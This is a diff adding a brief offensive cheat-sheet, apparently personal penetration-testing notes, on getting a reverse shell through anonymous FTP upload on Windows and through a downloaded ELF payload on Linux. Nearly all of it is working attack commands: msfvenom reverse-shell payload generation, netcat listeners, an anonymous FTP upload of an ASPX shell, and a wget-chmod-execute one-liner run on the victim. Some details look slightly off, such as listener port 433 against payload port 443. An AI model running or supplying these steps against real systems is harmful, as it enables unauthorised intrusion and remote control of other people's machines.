@@ -1,0 +1,23 @@
+FTP easy win:
+With MS FTP:
+Make the shell:
+msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=443 -f asp > shell.aspx
+nc -lvnp 433
+ftp $target
+anonymous
+anonymous
+put shell.aspx
+ls (to check)
+curl http://$target:21/shell.aspx 
+check netcat 
+
+Linux:
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your_ip> LPORT=<port> -f elf > shell.elf
+chmod +x shell.elf
+
+python3 -m http.server 80
+
+nc -lvnp <port>
+
+on victim
+wget http://<your_ip>/shell.elf -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell
